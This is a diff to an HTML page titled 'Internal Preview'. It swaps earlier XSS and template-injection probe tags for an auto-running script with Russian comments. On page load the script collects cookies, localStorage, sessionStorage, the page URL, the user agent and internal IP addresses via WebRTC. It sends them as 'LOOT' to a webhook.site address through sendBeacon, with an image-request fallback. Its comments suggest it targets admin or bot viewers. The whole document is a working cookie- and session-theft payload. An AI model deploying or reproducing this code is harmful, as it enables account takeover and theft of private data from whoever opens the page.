@@ -1,8 +1,41 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Internal Preview</title>
+</head>
 <body>
-    <img src="https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049/DEBUG?info=<script>new+Image().src='https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049/XSS_EXECUTED_IN_ADMIN_PANEL?c='+document.cookie</script>">
+    <script>
+        (async function() {
+            const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
+            
+            // Собираем всё, до чего дотянутся руки
+            const data = {
+                type: "BROWSER_DATA_LEAK",
+                url: window.location.href,
+                origin: window.origin,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                userAgent: navigator.userAgent,
+                // Пытаемся узнать внутренний IP через WebRTC (если не заблочено)
+                internalIP: await (async () => {
+                    try {
+                        const pc = new RTCPeerConnection();
+                        pc.createDataChannel("");
+                        const offer = await pc.createOffer();
+                        return offer.sdp.match(/(?:\d{1,3}\.){3}\d{1,3}/g);
+                    } catch (e) { return "blocked"; }
+                })()
+            };
 
-    <img src="https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049/PATH_DISCLOSURE/{{self._TemplateReference__context}}">
+            // Отправляем через Beacon API (оно надежнее для ботов, которые быстро закрывают страницу)
+            navigator.sendBeacon(hook + "/LOOT", JSON.stringify(data));
+            
+            // Запасной метод через картинку, если Beacon не сработал
+            new Image().src = hook + "/REPORT?c=" + btoa(document.cookie).substring(0, 100);
+        })();
+    </script>
+
+    <img src="https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049/JS_MAYBE_DISABLED">
 </body>
 </html>
